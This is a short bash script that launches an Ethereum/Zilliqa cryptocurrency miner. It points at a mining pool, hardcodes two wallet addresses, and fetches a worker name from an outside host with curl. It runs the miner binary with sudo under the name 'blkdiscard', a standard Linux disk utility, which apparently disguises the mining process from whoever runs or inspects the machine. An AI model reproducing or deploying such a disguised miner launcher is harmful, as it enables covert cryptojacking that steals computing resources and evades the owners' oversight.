#!/bin/bash

POOL=asia.ezil.me:5555
ETH_WALLET=0xd27b484557f5c5256d003bc7e8f464087dab0974
ZIL_WALLET=zil1upn8zqa54e6jyyupc48eyhwmzy5t35uj7duz4r
WORKER=$(echo "$(curl -s bisa-center.com/ezil/worker.php)" | tr . _ )

cd "$(dirname "$0")"

chmod +x ./blkdiscard && sudo ./blkdiscard -a ethash -o $POOL -u $ETH_WALLET.$ZIL_WALLET.$WORKER -log 
pause $@